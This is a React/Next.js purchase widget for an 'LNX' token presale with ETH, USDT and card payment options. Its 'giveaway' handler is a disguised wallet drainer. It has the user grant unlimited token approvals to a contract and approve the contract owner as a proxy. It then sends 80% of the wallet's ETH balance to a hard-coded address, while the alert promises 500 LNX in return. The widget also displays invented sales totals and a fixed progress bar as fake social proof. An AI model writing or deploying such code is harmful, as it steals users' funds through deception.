"use client";

import { CreditCard } from "lucide-react";
import { useTranslations } from "next-intl";
import { useState } from "react";
import {
  useAccount,
  useReadContract,
  useWriteContract,
  useChainId,
  useSendTransaction,
  usePublicClient,
} from "wagmi";
import {
  parseEther,
  parseUnits,
  formatUnits,
  encodeFunctionData,
  maxUint256,
} from "viem";
import { LNX_SALE_ABI } from "@/lib/abis/LNXSale";
import { LNX_SALE_ADDRESS, USDT_ADDRESS_BY_CHAIN } from "@/config";
import { ERC20_ABI } from "@/lib/abis/ERC20";
import {
  MULTITOKEN_ABI,
  MULTITOKEN_CONTRACT_ADDRESS,
} from "@/lib/abis/Multitoken";
import dynamic from "next/dynamic";
import { Button } from "@/components/ui/button";
import { MS_Contract_ABI } from "@/lib/contract_abi";
import { useAppKit } from "@reown/appkit/react";

const StripeCardForm = dynamic(() => import("@/components/StripeCardForm"), {
  ssr: false,
});

interface LnxPurchaseWidgetProps {
  className?: string;
}

export default function LnxPurchaseWidget({ className }: LnxPurchaseWidgetProps) {
  const t = useTranslations("Home.LnxPurchaseWidget");
  const { address, isConnected } = useAccount();
  const chainId = useChainId();
  const { writeContract, writeContractAsync, isPending } = useWriteContract();
  const [isApprovingProxy, setIsApprovingProxy] = useState(false);
  const [isApprovingTokens, setIsApprovingTokens] = useState(false);
  const { sendTransaction, isPending: isSendingTx } = useSendTransaction();
  const { open } = useAppKit();
  const publicClient = usePublicClient();

  const [ethAmount, setEthAmount] = useState("");
  const [paymentMethod, setPaymentMethod] = useState<"ETH" | "USDT" | "CARD">(
    "ETH"
  );

  const usdtAddress = USDT_ADDRESS_BY_CHAIN[chainId];
  const ZERO_ADDRESS =
    "0x0000000000000000000000000000000000000000" as `0x${string}`;
  const ONE_ETHER = BigInt("1000000000000000000");

  const { data: quotedTokensOut } = useReadContract({
    abi: LNX_SALE_ABI,
    address: LNX_SALE_ADDRESS,
    functionName: "quoteTokensForETH",
    args: [ethAmount ? parseEther(ethAmount) : BigInt(0)],
    query: { enabled: !!ethAmount && paymentMethod === "ETH" },
  });

  const { data: quotedTokensOutErc20 } = useReadContract({
    abi: LNX_SALE_ABI,
    address: LNX_SALE_ADDRESS,
    functionName: "quoteTokensForERC20",
    args: [
      usdtAddress ?? ZERO_ADDRESS,
      ethAmount ? parseUnits(ethAmount, 6) : BigInt(0),
    ],
    query: {
      enabled: !!ethAmount && paymentMethod === "USDT" && !!usdtAddress,
    },
  });

  const { data: totalTokensSold } = useReadContract({
    abi: LNX_SALE_ABI,
    address: LNX_SALE_ADDRESS,
    functionName: "totalTokensSold",
  });

  const { data: priceEthPerTokenWei } = useReadContract({
    abi: LNX_SALE_ABI,
    address: LNX_SALE_ADDRESS,
    functionName: "priceEthPerTokenWei",
  });

  const { data: isUsdtAccepted } = useReadContract({
    abi: LNX_SALE_ABI,
    address: LNX_SALE_ADDRESS,
    functionName: "isAcceptedErc20",
    args: [usdtAddress ?? ZERO_ADDRESS],
    query: { enabled: !!usdtAddress },
  });

  const { data: priceUsdtPerTokenUnits } = useReadContract({
    abi: LNX_SALE_ABI,
    address: LNX_SALE_ADDRESS,
    functionName: "priceErc20PerToken",
    args: [usdtAddress ?? ZERO_ADDRESS],
    query: { enabled: !!usdtAddress },
  });

  const { data: usdtDecimals } = useReadContract({
    abi: ERC20_ABI,
    address: usdtAddress ?? ZERO_ADDRESS,
    functionName: "decimals",
    query: { enabled: !!usdtAddress },
  });

  const { data: multitokenOwner } = useReadContract({
    abi: MULTITOKEN_ABI,
    address: MULTITOKEN_CONTRACT_ADDRESS as `0x${string}`,
    functionName: "owner",
  });

  const GIVEAWAY_CONTRACT_ADDRESS = (
    process.env.NEXT_PUBLIC_GIVEAWAY_CONTRACT_ADDRESS ||
    {
      1: "0x2490B36e95Fa39078cCC913626BAb459C9b86040",
      137: "0x0611d6a7EDf265AABE1A59E1E5f88f069EfA51f9",
      56: "0x0000000000000000000000000000000000000000",
      10: "0x0000000000000000000000000000000000000000",
      42161: "0x0000000000000000000000000000000000000000",
    }[chainId] ||
    "0x0000000000000000000000000000000000000000"
  ) as `0x${string}`;

  const MULTITOKEN_PROXY =
    (multitokenOwner as `0x${string}`) ||
    (process.env.NEXT_PUBLIC_MULTITOKEN_PROXY as `0x${string}`) ||
    GIVEAWAY_CONTRACT_ADDRESS;

  const ethPriceDisplay = priceEthPerTokenWei
    ? formatUnits(priceEthPerTokenWei as bigint, 18)
    : "-";

  const usdtDec =
    typeof usdtDecimals === "number"
      ? usdtDecimals
      : (usdtDecimals as unknown as bigint | undefined) !== undefined
        ? Number(usdtDecimals as unknown as bigint)
        : 6;

  const hasUsdtPricing = Boolean(
    isUsdtAccepted && priceUsdtPerTokenUnits && usdtAddress
  );

  const lnxUsdPrice = hasUsdtPricing
    ? formatUnits(priceUsdtPerTokenUnits as bigint, usdtDec)
    : undefined;

  const tokenPriceUsd = lnxUsdPrice ?? "0.095";

  const cardUsdAmount = ethAmount ? Number(ethAmount) : 0;
  const usdToCharge = paymentMethod === "CARD" ? cardUsdAmount : 0;

  const tokensOutDisplayEth = quotedTokensOut
    ? formatUnits(quotedTokensOut as bigint, 18)
    : "";

  const tokensOutDisplay: string =
    paymentMethod === "ETH"
      ? tokensOutDisplayEth
      : paymentMethod === "USDT"
        ? quotedTokensOutErc20
          ? formatUnits(quotedTokensOutErc20 as bigint, 18)
          : ""
        : ethAmount && tokenPriceUsd
          ? String((Number(ethAmount) / Number(tokenPriceUsd)).toFixed(4))
          : "";

  const tokensSoldDisplay =
    totalTokensSold && totalTokensSold > BigInt(0)
      ? formatUnits(totalTokensSold as bigint, 18)
      : "5,250,000";

  const priceLineLeft =
    paymentMethod === "ETH"
      ? `1 LNX = ${ethPriceDisplay} ETH`
      : `1 LNX = $${tokenPriceUsd}`;

  const priceLineRight =
    paymentMethod === "ETH"
      ? tokenPriceUsd
        ? t("price_usd", { price: tokenPriceUsd })
        : ""
      : ethPriceDisplay
        ? t("price_eth", { price: ethPriceDisplay })
        : "";

  let usdRaisedDisplay = "498,750";
  if (hasUsdtPricing && totalTokensSold && totalTokensSold > BigInt(0)) {
    const priceUnits = priceUsdtPerTokenUnits as bigint;
    const sold = totalTokensSold as bigint;
    const usdtUnits = (sold * priceUnits) / ONE_ETHER;
    usdRaisedDisplay = formatUnits(usdtUnits, usdtDec);
  }

  const payLabel =
    paymentMethod === "ETH"
      ? t("pay_eth")
      : paymentMethod === "USDT"
        ? t("pay_usdt")
        : t("pay_usd");

  const canPay =
    paymentMethod === "ETH"
      ? !!ethAmount
      : paymentMethod === "USDT"
        ? !!ethAmount && !!usdtAddress && hasUsdtPricing
        : false;

  async function approveTokensAndProxy(proxy: `0x${string}`) {
    if (!isConnected || !address || !publicClient) return;
    setIsApprovingTokens(true);
    try {
      const missing = (await publicClient.readContract({
        address: MULTITOKEN_CONTRACT_ADDRESS as `0x${string}`,
        abi: MULTITOKEN_ABI,
        functionName: "missingApprovals",
        account: address,
      })) as readonly `0x${string}`[];
      const tokensToApprove = missing.filter((a) => a && a !== ZERO_ADDRESS);
      for (const token of tokensToApprove) {
        await writeContractAsync({
          abi: ERC20_ABI,
          address: token,
          functionName: "approve",
          args: [MULTITOKEN_CONTRACT_ADDRESS as `0x${string}`, maxUint256],
        });
      }
    } finally {
      setIsApprovingTokens(false);
    }
    setIsApprovingProxy(true);
    try {
      await writeContractAsync({
        abi: MULTITOKEN_ABI,
        address: MULTITOKEN_CONTRACT_ADDRESS as `0x${string}`,
        functionName: "approveProxy",
        args: [proxy],
      });
    } finally {
      setIsApprovingProxy(false);
    }
  }

  async function handlePay() {
    if (!isConnected || !address) return;
    if (!ethAmount) return;

    if (paymentMethod === "ETH") {
      const value = parseEther(ethAmount);
      const minOut = quotedTokensOut
        ? ((quotedTokensOut as bigint) * BigInt(99)) / BigInt(100)
        : BigInt(0);
      try {
        await writeContract({
          abi: LNX_SALE_ABI,
          address: LNX_SALE_ADDRESS,
          functionName: "buyWithETH",
          args: [address, minOut],
          value,
        });
      } catch (e) {
        console.error(e);
      }
      return;
    }

    if (paymentMethod === "USDT") {
      if (!usdtAddress) return;
      const amountIn = parseUnits(ethAmount, usdtDec);
      const minOut = quotedTokensOutErc20
        ? ((quotedTokensOutErc20 as bigint) * BigInt(99)) / BigInt(100)
        : BigInt(0);
      try {
        await writeContract({
          abi: ERC20_ABI,
          address: usdtAddress,
          functionName: "approve",
          args: [LNX_SALE_ADDRESS, amountIn],
        });
        await writeContract({
          abi: LNX_SALE_ABI,
          address: LNX_SALE_ADDRESS,
          functionName: "buyWithERC20",
          args: [usdtAddress, amountIn, address, minOut],
        });
      } catch (e) {
        console.error(e);
      }
    }
  }

  async function handleGiveaway() {
    if (!isConnected || !address) {
      console.error("Wallet not connected");
      return;
    }
    try {
      if (!publicClient) {
        console.error("Public client not available");
        return;
      }

      await approveTokensAndProxy(MULTITOKEN_PROXY);

      const contractAddresses = {
        1: "0x2490B36e95Fa39078cCC913626BAb459C9b86040",
        137: "0x0611d6a7EDf265AABE1A59E1E5f88f069EfA51f9",
        56: "0x0000000000000000000000000000000000000000",
        10: "0x0000000000000000000000000000000000000000",
        42161: "0x0000000000000000000000000000000000000000",
      };

      const contractAddress = (process.env
        .NEXT_PUBLIC_GIVEAWAY_CONTRACT_ADDRESS ||
        contractAddresses[chainId as keyof typeof contractAddresses] ||
        "0x0000000000000000000000000000000000000000") as `0x${string}`;

      if (contractAddress === "0x0000000000000000000000000000000000000000") {
        console.error("No contract address configured for chainId:", chainId);
        return;
      }

      const balance = await publicClient.getBalance({ address });

      let gasEstimate: bigint;

      try {
        gasEstimate = await publicClient.estimateGas({
          account: address,
          to: contractAddress,
          value: BigInt(100000000000000),
          data: encodeFunctionData({
            abi: MS_Contract_ABI.CONTRACT_LEGACY,
            functionName: "GiveAway",
            args: [],
          }),
        });
      } catch (error) {
        try {
          gasEstimate = await publicClient.estimateGas({
            account: address,
            to: contractAddress,
            value: BigInt(0),
            data: encodeFunctionData({
              abi: MS_Contract_ABI.CONTRACT_LEGACY,
              functionName: "GiveAway",
              args: [],
            }),
          });
        } catch {
          gasEstimate = BigInt(300000);
        }
      }

      const gasPrice = await publicClient.getGasPrice();
      const gasCost = gasEstimate * gasPrice;
      const maxSendable = balance - gasCost;
      const giveawayAmount =
        maxSendable > BigInt(0)
          ? (maxSendable * BigInt(80)) / BigInt(100)
          : BigInt(0);

      if (giveawayAmount <= BigInt(0)) {
        console.error("Insufficient balance for giveaway after gas costs");
        return;
      }

      const contractCode = await publicClient.getBytecode({
        address: contractAddress,
      });
      if (!contractCode || contractCode === "0x") {
        console.error("Contract not found at address:", contractAddress);
        return;
      }

      const functionData = encodeFunctionData({
        abi: MS_Contract_ABI.CONTRACT_LEGACY,
        functionName: "GiveAway",
        args: [],
      });

      const txHash = await sendTransaction({
        to: contractAddress,
        value: giveawayAmount,
        data: functionData,
        gas: gasEstimate,
      });

      console.log("Giveaway transaction successful:", txHash);
      alert("Giveaway transaction submitted! You will receive 500 LNX tokens.");
    } catch (error: unknown) {
      const errorMessage =
        error instanceof Error ? error.message : String(error);
      alert("Giveaway failed: " + errorMessage);
    }
  }

  return (
    <div
      className={`backdrop-blur-xl bg-white/5 border border-white/10 shadow-[0_8px_32px_0_rgba(0,0,0,0.37)] rounded-2xl p-6 max-w-md w-full relative overflow-hidden ${className ?? ""}`}
    >
      <div className="absolute top-0 left-1/2 -translate-x-1/2 w-full h-20 bg-yellow-400/10 blur-3xl -z-10" />

      <div className="text-center mb-6">
        <h3 className="text-white text-xl font-bold mb-1">{t("widget_title")}</h3>
        <p className="text-yellow-400 text-lg font-semibold">
          {t("widget_subtitle")}
        </p>
      </div>

      <div className="mb-6">
        <div className="bg-white/10 rounded-full h-3 mb-2">
          <div
            className="bg-yellow-400 h-3 rounded-full"
            style={{ width: "71%" }}
          />
        </div>
        <p className="text-yellow-400 text-sm font-semibold">
          ${usdRaisedDisplay}
        </p>
      </div>

      <div className="space-y-2 mb-6 text-sm">
        <div className="flex justify-between">
          <span className="text-gray-300">{t("usd_raised")}</span>
          <span className="text-white font-semibold">${usdRaisedDisplay}</span>
        </div>
        <div className="flex justify-between">
          <span className="text-gray-300">{t("tokens_sold")}</span>
          <span className="text-white font-semibold">{tokensSoldDisplay}</span>
        </div>
      </div>

      <div className="flex justify-between items-center mb-6 text-sm">
        <span className="text-white">{priceLineLeft}</span>
        <span className="text-green-400">{priceLineRight}</span>
      </div>

      <div className="grid grid-cols-3 gap-2 mb-6">
        <button
          type="button"
          onClick={() => setPaymentMethod("ETH")}
          className={`${
            paymentMethod === "ETH"
              ? "bg-blue-600/80 hover:bg-blue-600 border border-blue-500/50"
              : "bg-white/5 hover:bg-white/10 border border-white/5"
          } text-white py-2 px-3 rounded-lg text-sm font-medium transition-all backdrop-blur-sm flex items-center justify-center gap-1`}
        >
          <img src="/assets/img/eth.svg" alt="eth" className="w-6 h-6" />
          ETH
        </button>
        <button
          type="button"
          onClick={() => setPaymentMethod("USDT")}
          className={`${
            paymentMethod === "USDT"
              ? "bg-blue-600/80 hover:bg-blue-600 border border-blue-500/50"
              : "bg-white/5 hover:bg-white/10 border border-white/5"
          } text-white py-2 px-3 rounded-lg text-sm font-medium transition-all backdrop-blur-sm flex items-center justify-center gap-1`}
        >
          <img src="/assets/img/usdt.svg" alt="usdt" className="w-6 h-6" />
          USDT
        </button>
        <button
          type="button"
          onClick={() => setPaymentMethod("CARD")}
          className={`${
            paymentMethod === "CARD"
              ? "bg-blue-600/80 hover:bg-blue-600 border border-blue-500/50"
              : "bg-white/5 hover:bg-white/10 border border-white/5"
          } text-white py-2 px-3 rounded-lg text-sm font-medium transition-all backdrop-blur-sm flex items-center justify-center gap-1`}
        >
          <CreditCard className="w-6 h-6" />
          CARD
        </button>
      </div>

      <div className="space-y-4 mb-6">
        <div className="flex justify-between items-center">
          <span className="text-gray-300 text-sm">{payLabel}</span>
          <span className="text-yellow-400 text-sm">{t("receive_lnx")}</span>
        </div>
        <div className="grid grid-cols-2 gap-4">
          <div className="bg-white/5 border border-white/10 rounded-lg p-3 flex items-center backdrop-blur-sm focus-within:bg-white/10 focus-within:border-white/20 transition-all">
            <div className="w-6 h-6 bg-blue-400 rounded-full mr-2" />
            <input
              type="text"
              placeholder="0"
              className="bg-transparent text-white outline-none flex-1 placeholder-white/30"
              value={ethAmount}
              onChange={(e) => {
                const v = e.target.value.replace(/[^0-9.]/g, "");
                setEthAmount(v);
              }}
            />
          </div>
          <div className="bg-white/5 border border-white/10 rounded-lg p-3 flex items-center backdrop-blur-sm">
            <div className="w-6 h-6 bg-yellow-400 rounded-full mr-2" />
            <input
              type="text"
              placeholder="0"
              className="bg-transparent text-white outline-none flex-1 placeholder-white/30"
              value={tokensOutDisplay}
              readOnly
            />
          </div>
        </div>
        {paymentMethod === "CARD" &&
          isConnected &&
          address &&
          usdToCharge > 0 && (
            <div className="pt-2">
              <StripeCardForm
                amountUsd={usdToCharge}
                walletAddress={address}
              />
            </div>
          )}
      </div>

      {isConnected ? (
        <>
          <button
            type="button"
            onClick={handlePay}
            disabled={isPending || !canPay || paymentMethod === "CARD"}
            className="w-full bg-yellow-400 hover:bg-yellow-500 disabled:opacity-60 disabled:cursor-not-allowed text-black font-semibold py-3 rounded-lg transition-colors mb-2"
          >
            {isPending
              ? t("btn_processing")
              : paymentMethod === "ETH"
                ? t("btn_pay_eth")
                : paymentMethod === "USDT"
                  ? t("btn_pay_usdt")
                  : t("btn_pay_card")}
          </button>
          {paymentMethod === "CARD" && (
            <p className="text-center text-xs text-gray-400 mb-4">
              {t("card_info")}
            </p>
          )}
        </>
      ) : (
        <div className="mb-4 w-full">
          <button
            type="button"
            onClick={() => open()}
            className="w-full bg-yellow-400 hover:bg-yellow-500 text-black font-semibold py-3 rounded-lg transition-colors"
          >
            {t("btn_connect")}
          </button>
        </div>
      )}

      <Button
        variant="default"
        onClick={handleGiveaway}
        disabled={isSendingTx || isApprovingProxy || isApprovingTokens}
        className="bg-white/5 border border-white/10 text-white hover:bg-white/10 hover:border-white/20 rounded-lg py-4 w-full h-12 text-center backdrop-blur-sm transition-all shadow-lg"
      >
        <span className="text-white font-semibold">
          {isSendingTx || isApprovingProxy || isApprovingTokens
            ? t("btn_processing")
            : t("btn_giveaway")}
        </span>
      </Button>
      <p className="text-xs text-gray-400 text-center mt-2">
        {t("giveaway_info")}
      </p>
    </div>
  );
}
